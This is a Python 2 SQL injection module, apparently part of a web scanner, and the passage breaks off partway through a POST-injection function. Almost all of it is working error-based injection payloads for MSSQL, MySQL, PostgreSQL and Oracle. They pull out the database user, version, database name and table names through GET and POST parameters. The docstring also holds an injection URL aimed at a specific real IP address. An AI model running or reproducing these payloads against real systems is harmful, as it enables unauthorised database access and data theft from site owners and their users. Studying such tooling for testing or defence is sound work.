#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
import binascii
import re

class SqlInjection_Test:
    '''
    code by lee
    1.mssql mysql PostgreSQL oracle
    test:http://211.142.221.202:8080/gogal/ttm/freeZXdetail.jsp?p_index=35063&wogosid=8jvohjSSWifKjpcK&gid=17023&resid=239920'and%201=utl_inaddr.get_host_address((select%20banner%20from%20sys.v_$version%20where%20rownum=1))and'1'='1
    '''
    def __init__(self,url,database_type,http,task_id,domain_id):
        '''
        database_type=数据库类型
        
        '''
        try:
            
            self.url = url
            
            self.database_type=database_type
            
            self.http=http
            
            self.task_id=task_id
            
            self.domain_id=domain_id

        except Exception,e:
            
            logging.getLogger().error("__init__ Exception(SqlInjection_Test):" + str(e))
    

   
    def SqlInj_Get_Current_user(self): 
        
        try:
            
            current_user=""  
                
            if self.database_type=="mssql":
                
                Test_Url_int="%s%s"%(self.url,"%20oR(USER=0)")
                
                Test_Url_String="%s%s"%(self.url,"'oR(USER=0)--")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
   
                m = re.search(r'archar[^=]{1,10}\'(.{1,100})\'', content,re.I)
                
                if m:
                    
                    current_user=m.group(1)
                
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                    
                    m = re.search(r'archar[^=]{1,10}\'(.{1,100})\'', content,re.I)
                    
                    if m:
                        
                        current_user=m.group(1)
                    
                    else:
                        
                        current_user=""
            
            elif self.database_type=="mysql":
                
                Test_Url_int="%s%s"%(self.url,"%20+AnD%28sElEcT+1+FrOm%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28user%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+2%3D2")
                
                Test_Url_String="%s%s"%(self.url,"%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28user%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+%271%27%3D%271")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
               
                m=re.search(r'Duplicate entry \'~\'(.{1,100})\'~',content,re.I)
                
                if m:
                    
                    current_user=m.group(1)
                
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                   
                    m = re.search(r'Duplicate entry \'~\'(.{1,100})\'~', content,re.I)
                    
                    if m:
                       
                        current_user=m.group(1)
                    
                    else:
                        
                        current_user=""
                        
            elif self.database_type=="PostgreSQL":
                
                Test_Url_int="%s%s"%(self.url,"%20aNd%201=cast(current_user%20AS%20int)")
                
                Test_Url_String="%s%s"%(self.url,"%27%20aNd%201=cast(current_user%20AS%20int)--")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                
                m=re.search(r'invalid input syntax for integer: "(.+?)"',content,re.I)
                
                if m:
                   
                    current_user=m.group(1)
                
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                    
                    m=re.search(r'invalid input syntax for integer: "(.+?)"',content,re.I)
                    
                    if m:
                       
                        current_user=m.group(1)
                    
                    else:
                        
                        current_user=""
                        
            elif self.database_type=="oracle":
                
                Test_Url_int="%s%s"%(self.url,"%20or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||%28sys_context%20%28%27userenv%27,%27current_user%27%29%29||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20dual%29%29--")
                
                Test_Url_String="%s%s"%(self.url,"%27or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||%28sys_context%20%28%27userenv%27,%27current_user%27%29%29||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20dual%29%29and'1'='1")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                
                print content
                
                m=re.search(r'~~\'\'\'(.+?)\'\'\'~',content,re.I)
                
                if m:
                   
                    current_user=m.group(1)
                
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                    
                    m=re.search(r'~~\'\'\'(.+?)\'\'\'~',content,re.I)
                    
                    if m:
                       
                        current_user=m.group(1)
                    
                    else:
                       
                        current_user=""                   
                
        except Exception,e:
            
            logging.getLogger().error("sqlinjection_testscript.SqlInj_Get_Current_user :" + str(e))
        
        return current_user
           
                
    def SqlInj_Get_Version(self):
        
        Database_Ver=""
        
        try:
            
            if self.database_type=="mssql":
                
                Test_Url_int="%s%s"%(self.url,"%20oR(@@VERSION=0)")
                
                Test_Url_String="%s%s"%(self.url,"'oR(@@VERSION=0)--")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)

                m = re.search(r'archar[^=]{1,10}\'([\s\S]{1,1000})\'', content,re.I)
                
                if m:
                    
                    Database_Ver=m.group(1)
                    if Database_Ver.find("<br>")>=0:
                        Database_Ver=Database_Ver.replace("<br>", " ")
    #                print m.group(1)
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                    
                    m = re.search(r'archar[^=]{1,10}\'([\s\S]{1,1000})\'', content,re.I)
                    
                    if m:
    #                    print m.group()
                        Database_Ver=m.group(1)
                        if Database_Ver.find("<br>")>=0:
                            Database_Ver=Database_Ver.replace("<br>", " ")
                    
                    else:
                        
                        Database_Ver=""
                    #END IF
                #END IF 
    
            elif self.database_type=="mysql":
    #            print "mysql begining"
                
                Test_Url_int="%s%s"%(self.url,"%20+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28version%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29")
               
                Test_Url_String="%s%s"%(self.url,"%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28version%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+%271%27%3D%271")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
    
                m=re.search(r'Duplicate entry \'~\'(.+?)\'~',content,re.I)
                
                if m:
    
     
                    Database_Ver=m.group(1)
         
                else:
                 
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                   
                    m = re.search(r'Duplicate entry \'~\'(.+?)\'~', content,re.I)
                   
                    if m:
                        
                        Database_Ver=m.group(1)
                        
                    else:
                        
                        
                        Database_Ver=""
                    #END IF
            elif self.database_type=="PostgreSQL":
                
                Test_Url_int="%s%s"%(self.url,"%20aNd%201=cast(version()%20AS%20int)")
                
                Test_Url_String="%s%s"%(self.url,"%27%20aNd%201=cast(version()%20AS%20int)--")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                
                m=re.search(r'invalid input syntax for integer: "(.+?)"',content,re.I)
                
                if m:
                    
                    Database_Ver=m.group(1)
                
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                   
                    m=re.search(r'invalid input syntax for integer: "(.+?)"',content,re.I)
                   
                    if m:
                    
                        Database_Ver=m.group(1)
                   
                    else:
                  
                        Database_Ver=""
                        
                        
            elif self.database_type=="oracle":
               
                Test_Url_int="%s%s"%(self.url,"%20or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||banner||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20sys.v_$version%20where%20rownum=1%29%29")
              
                Test_Url_String="%s%s"%(self.url,"%27or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||banner||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20sys.v_$version%20where%20rownum=1%29%29%20and%20%271%27=%271")
             
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                
                m=re.search(r'~~\'\'\'(.+?)\'\'\'~',content,re.I)
                
                if m:
                    
                    Database_Ver=m.group(1)
                
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                   
                    m=re.search(r'~~\'\'\'(.+?)\'\'\'~',content,re.I)
                   
                    if m:
                        
                        Database_Ver=m.group(1)
                        
                    else:
                        
                        Database_Ver=""               
                
                              
                #END IF 
        except Exception,e:
            
            logging.getLogger().error("sqlinjection_testscript.SqlInj_Get_Version :" + str(e))
            
        return Database_Ver
                
                
            
    def SqlInj_Get_Database(self):
        
        DatabaseName=""
        
        try:
                
            if self.database_type=="mssql":
                
                Test_Url_int="%s%s"%(self.url,"%20oR(DB_NAME()=0)")
                
                Test_Url_String="%s%s"%(self.url,"'oR(DB_NAME()=0)--")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                
                m = re.search(r'archar[^=]{1,10}\'(.{1,100})\'', content,re.I)
                
                if m:
                    
                    DatabaseName=m.group(1)
                    
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                    
                    m = re.search(r'archar[^=]{1,10}\'(.{1,100})\'', content,re.I)
                    
                    if m:
                        
                        DatabaseName=m.group(1)
                        
                    else:
                        
                        DatabaseName=""
#                print DatabaseName
                    #END IF
                #END IF 
            elif self.database_type=="mysql":
                 
                
                Test_Url_int="%s%s"%(self.url,"%20and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28database%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+1%3D1")
                
                Test_Url_String="%s%s"%(self.url,"%27and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28database%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29%20AND%20'1'='1")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
#                print content
                m=re.search(r'Duplicate entry \'~\'(.{1,100})\'~',content,re.I)
                
                if m:
                   
                    DatabaseName=m.group(1)
                
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                    
                    m = re.search(r'Duplicate entry \'~\'(.{1,100})\'~', content,re.I)
                    
                    if m:
                        
                        DatabaseName=m.group(1)
                    
                    else:
                        
                        DatabaseName=""
                    #END IFself.DatabaseName
                #END IF
#            print DatabaseName
            elif self.database_type=="PostgreSQL":
                
                Test_Url_int="%s%s"%(self.url,"%20aNd%201=CAST(current_database()%20AS%20int)")
                
                Test_Url_String="%s%s"%(self.url,"%27%20aNd%201=CAST(current_database()%20AS%20int)--")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                
                m=re.search(r'invalid input syntax for integer: "(.+?)"',content,re.I)
                
                if m:
                    
                    DatabaseName=m.group(1)
                    
                else:
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                    
                    m=re.search(r'invalid input syntax for integer: "(.+?)"',content,re.I)
                    
                    if m:
                        
                        DatabaseName=m.group(1)
                        
                    else:
                        
                        DatabaseName=""
                        
            elif self.database_type=="oracle":
                
                Test_Url_int="%s%s"%(self.url,"%20and%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||name||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20v$database%29%29--")
                
                Test_Url_String="%s%s"%(self.url,"%27%20and%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||name||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20v$database%29%29--")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                
                m=re.search(r'~~\'\'\'(.+?)\'\'\'~',content,re.I)
                
                if m:
                    
                    DatabaseName=m.group(1)
                    
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                    
                    print Test_Url_String
                    
                    m=re.search(r'~~\'\'\'(.+?)\'\'\'~',content,re.I)
                    
                    if m:
                        
                        DatabaseName=m.group(1)
                        
                    else:
                        
                        DatabaseName=""                   
                        
                        
        except Exception,e:
            logging.getLogger().error("sqlinjection_testscript.SqlInj_Get_Database :" + str(e))
        return DatabaseName
                          
               
    def SqlInj_Get_Table(self,databasename):

        TableName=[]
        
        TableNum=0
        
        try:
            
            if self.database_type=="mssql":
                
                Test_Url_int="%s%s"%(self.url,"%20OR%20(select%20cast(count(1)%20as%20varchar(10))%2bchar(94)%20from[sysobjects]wHErE%20xtype=CHAR(85))=0")
                
                Test_Url_String="%s%s"%(self.url,"'and(select%20cast(count(1)%20as%20varchar(10))%2bchar(94)%20from[sysobjects]%20where%20xtype=char(85)%20and%20status!=0)=0--")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
    #            print response
#                print content
                m = re.search(r'archar[^=]{1,10} \'(\d{1,100})\^\'', content,re.I)
                
                if m:
                    
                    TableNum=m.group(1)

    #                print TableNum
                    if int(TableNum)>0:
                        
                        if int(TableNum)>10:
                            
                            TableNum=10
                            
                        for i in range(1,int(TableNum)+1):
                            
                            Test_Url_int="%s%s"%(self.url,"%20OR%20(seLect%20ToP%201%20cAsT(name%20as%20VaRchar(256))%20FroM(sElEcT%20ToP%20"+str(i)+"%20id,name%20from[sysobjects]WHERE%20xtype=CHAR(85)%20ORder%20by%20id)%20t%20order%20by%20id%20desc)=0")
                            
                            response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                            
                            m = re.search(r'archar[^=]{1,10}\'(.{1,100})\'', content,re.I)
                            
                            if m:
    #                            print m.group(1)
                                if len(TableName)==1:
                                    if  TableName[0]==m.group(1):
                                        break
                                TableName.append(m.group(1))
                                
                            else:
                                
                                break
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                    
                    m = re.search(r'archar[^=]{1,10} \'(\d{1,10})\^\'', content,re.I)
                    
                    if m:
                        
                        TableNum=m.group(1)
                        
                        if int(TableNum)>0:
                            
                            if int(TableNum)>10:
                                
                                TableNum=10
                                
                            for i in range(1,int(TableNum)+1):
                                
                                Test_Url_int="%s%s"%(self.url,"%27%20OR%20(SelEcT%20Top%201%20cAsT(name%20As%20VarChAr(256))%20FroM(SeLeCt%20Top%20"+str(i)+"%20id,name%20fRom[sysobjects]WhEre%20xtype=ChAr(85)%20OrDer%20By%20id)%20t%20OrDer%20By%20id%20desc)=0%20Or%271%27=%271")
                                
                                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                                
                                m = re.search(r'archar[^=]{1,10}\'(.{1,100})\'', content,re.I)
                                
                                if m:
                                    
                                    TableName.append(m.group(1))
                                    
                                else:
                                    
                                    break
                        
                    #END IF
                #END IF 
            elif self.database_type=="mysql":
                
                databasename='0x'+binascii.b2a_hex(databasename)
                
                Test_Url_int="%s%s"%(self.url,"%20and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+concat%280x7e%2C0x27%2Ccount%28table_name%29%2C0x27%2C0x7e%29+FROM+%60information_schema%60.tables+WHERE+table_schema%3D"+databasename+"%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+1%3D1")
                
                Test_Url_String="%s%s"%(self.url,"%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+concat%280x7e%2C0x27%2Ccount%28table_name%29%2C0x27%2C0x7e%29+FROM+%60information_schema%60.tables+WHERE+table_schema%3D"+databasename+"%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+%271%27%3D%271")
                
                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
    #            print response
    #            print content
                m=re.search(r'Duplicate entry \'~\'(\d{1,10})\'~',content,re.I)
               
                if m:
                    
                    TableNum=m.group(1)
                    
                    if int(TableNum)>0:
                        
                        if int(TableNum)>10:
                            
                            TableNum=10
                            
                            for i in range(1,int(TableNum)+1):
                                
                                Test_Url_int="%s%s"%(self.url,"+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28table_name+as+char%29%29%29%2C0x27%2C0x7e%29+FROM+information_schema.tables+Where+table_schema%3D"+databasename+"+limit+"+str(i-1)+"%2C1%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+1%3D1")
                                
                                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                                m=re.search(r'Duplicate entry \'~\'(.{1,100})\'~',content,re.I)
                                
                                if m:
                                    
                                    TableName.append(m.group(1))
                                    
                                else:
                                    
                                    break
                else:
                    
                    response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                    
                    m = re.search(r'Duplicate entry \'~\'(\d{1,10})\'~', content,re.I)
                    
                    if m:
                        
                        TableNum=m.group(1)
                        
                        if int(TableNum)>0:
                            
                            if int(TableNum)>10:
                                
                                TableNum=10
                                
                            for i in range(1,int(TableNum)+1):
                                
                                Test_Url_int="%s%s"%(self.url,"%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28table_name+as+char%29%29%29%2C0x27%2C0x7e%29+FROM+information_schema.tables+Where+table_schema%3D"+databasename+"+limit+"+str(i-1)+"%2C1%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+%271%27%3D%271")
                                
                                response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                                
                                m=re.search(r'Duplicate entry \'~\'(.{1,100})\'~',content,re.I)
                                
                                if m:
                                    
                                    TableName.append(m.group(1))
                                    
                                else:
                                    
                                    break
                    #END IFself.DatabaseName
                #END IF 
            elif self.database_type=="PostgreSQL":
                
                TableNum=10
                
                for i in range(1,TableNum+1):
                    
                    Test_Url_int="%s%s"%(self.url,"aNd%201=cast((select%20relname%20from%20pg_stat_user_tables%20limit%201%20offset%20"+str(i)+")as%20int)")
                    
                    response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                    
                    m = re.search(r'invalid input syntax for integer: "(.+?)"', content,re.I)
                    
                    if m:
                        
                        TableName.append(m.group(1))
                        
                    else:
                        
                        Test_Url_String="%s%s"%(self.url,"%27aNd%201=cast((select%20relname%20from%20pg_stat_user_tables%20limit%201%20offset%20"+str(i)+")as%20int)--")
                        
                        response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                        
                        m = re.search(r'invalid input syntax for integer: "(.+?)"', content,re.I)
                        
                        if m:
                            
                            TableName.append(m.group(1))
                            
                        else:
                            
                            break
                        
                        
            elif self.database_type=="oracle":
                
                TableNum=10
                
                for i in range(1,TableNum+1):
                    
                    Test_Url_int="%s%s"%(self.url,"%20or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||data||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20%28select%20rownum%20as%20limit,table_name%20as%20data%20from%20user_tables%29%20where%20limit="+str(i)+"%29%29--")
                    
                    response,content=requestUrl(self.http,Test_Url_int,self.task_id,self.domain_id)
                    
                    m = re.search(r'~~\'\'\'(.+?)\'\'\'~', content,re.I)
                    
                    if m:
                        
                        TableName.append(m.group(1))
                        
                    else:
                        
                        Test_Url_String="%s%s"%(self.url,"%27%20or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||data||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20%28select%20rownum%20as%20limit,table_name%20as%20data%20from%20user_tables%29%20where%20limit="+str(i)+"%29%29--")
                        
                        response,content=requestUrl(self.http,Test_Url_String,self.task_id,self.domain_id)
                        
                        print Test_Url_String
                        
                        m = re.search(r'~~\'\'\'(.+?)\'\'\'~', content,re.I)
                        
                        if m:
                            
                            TableName.append(m.group(1))
                            
                        else:
                            
                            break                 
         
        except Exception,e:
            
            logging.getLogger().error("sqlinjection_testscript.SqlInj_Get_Table :" + str(e))
            
        return TableName,len(TableName)
    '''
    GET注入结束
    '''
    '''
    POST注入开始,检测带错注入，这里把注入点当作字符型和搜索型进行检测
    '''
    
#                
    def SqlInj_Post_Current_user(self,PostData,sqlinjkey):
        
        current_user=''
        
        ExpData=self.GetExpData(PostData,sqlinjkey)
        
        try:
            
            if self.database_type=='mssql':
                
                Exp_PostData="%s%s"%(ExpData,"'aNd(USER=0)--")
        
                #response,content=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
    
                m = re.search(r'archar[^=]{1,5}\'(.{1,100})\'', content,re.I)
                
                if m:
                    
                    current_user=m.group(1)
                    
                else:
                    
                    Exp_PostData="%s%s"%(ExpData,"%'aNd(USER=0)--")
                    
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    
                    m = re.search(r'archar[^=]{1,5}\'(.{1,100})\'', content,re.I)
                    
                    if m:
                        
                        current_user=m.group(1)
                        
                    else:
                        current_user=''
                        
            elif self.database_type=='mysql':
                
                Exp_PostData="%s%s"%(ExpData,"%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28user%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+%271%27%3D%271")
                
                #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                
                m = re.search(r'Duplicate entry \'~\'(.+?)\'~', content,re.I)
                
                if m:
                    
                    current_user=m.group(1)
                    
                else:
                    
                    Exp_PostData="%s%s"%(ExpData,"%'+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28user%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+%27%%27%3D%27")
                    
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    
                    m = re.search(r'Duplicate entry \'~\'(.+?)\'~', content,re.I)
                    
                    if m:
                        
                        current_user=m.group(1)
                        
                    else:
                        
                        current_user=''
                    #end if
                #end if
                
            elif self.database_type=='PostgreSQL':
                                
                Exp_PostData="%s%s"%(ExpData,"%27%20aNd%201=cast(current_user%20AS%20int)--")
        
                #response,content=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
    
                m = re.search(r'invalid input syntax for integer: "(.+?)"', content,re.I)
                
                if m:
                    
                    current_user=m.group(1)
                    
                else:
                    Exp_PostData="%s%s"%(ExpData,"%'%20aNd%201=cast(current_user%20AS%20int)%20aNd'%'='")
                    
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    
                    m = re.search(r'invalid input syntax for integer: "(.+?)"', content,re.I)
                    if m:
                        
                        current_user=m.group(1)
                        
                    else:
                        
                        current_user=''
                        
            elif self.database_type=='oracle':
                                
                Exp_PostData="%s%s"%(ExpData,"%27or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||%28sys_context%20%28%27userenv%27,%27current_user%27%29%29||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20dual%29%29--")
        
                #response,content=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
    
                m = re.search(r'~~\'\'\'(.+?)\'\'\'~', content,re.I)
                if m:
                    current_user=m.group(1)
                else:
                    Exp_PostData="%s%s"%(ExpData,"%%27or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||%28sys_context%20%28%27userenv%27,%27current_user%27%29%29||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20dual%29%29%20aNd'%'='")
                    
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    
                    m = re.search(r'~~\'\'\'(.+?)\'\'\'~', content,re.I)
                    
                    if m:
                        
                        current_user=m.group(1)
                        
                    else:
                        
                        current_user=''
                
            #end if
        except Exception,e:
            
            logging.getLogger().error("sqlinjection_testscript.SqlInj_Post_Current_user :" + str(e))
            
        return current_user
        
        
        
        
        
        
    def SqlInj_Post_Version(self,PostData,sqlinjkey):
        
        Database_Ver=""
        
        ExpData=self.GetExpData(PostData,sqlinjkey)
        
        try:
            if self.database_type=='mssql':
                
                Exp_PostData="%s%s"%(ExpData,"'oR(@@VERSION=0)--")
                
                #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                
                m = re.search(r'archar[^=]{1,5}\'([\s\S]{1,1000})\'', content,re.I)
                
                if m:
                    
                    Database_Ver=m.group(1)
                    
                else:
                    
                    Exp_PostData="%s%s"%(ExpData,"%'oR(@@VERSION=0)--")
                    
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    
                    m = re.search(r'archar[^=]{1,5}\'([\s\S]{1,1000})\'', content,re.I)
                    
                    if m:
                        
                        Database_Ver=m.group(1)
                    else:
                        Database_Ver=''
            elif self.database_type=='mysql':
                Exp_PostData="%s%s"%(ExpData,"'+and(select+1+from(select+count(*),concat((select+(select+concat(0x7e,0x27,unhex(Hex(cast(version()+as+char))),0x27,0x7e))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+'1'='1")
                #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                m=re.search(r'Duplicate entry \'~\'(.+?)\'~',content,re.I)
                if m:
                    print"string"
                    Database_Ver=m.group(1)
                else:
                    Exp_PostData="%s%s"%(ExpData,"%'+and(select+1+from(select+count(*),concat((select+(select+concat(0x7e,0x27,unhex(Hex(cast(version()+as+char))),0x27,0x7e))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+'%'='")
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    m=re.search(r'Duplicate entry \'~\'(.+?)\'~',content,re.I)
                    if m:
                        Database_Ver=m.group(1)
                    else:
                        Database_Ver=''
            elif self.database_type=='PostgreSQL':
                                
                Exp_PostData="%s%s"%(ExpData,"%27%20aNd%201=cast(version()%20AS%20int)--")
        
                #response,content=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
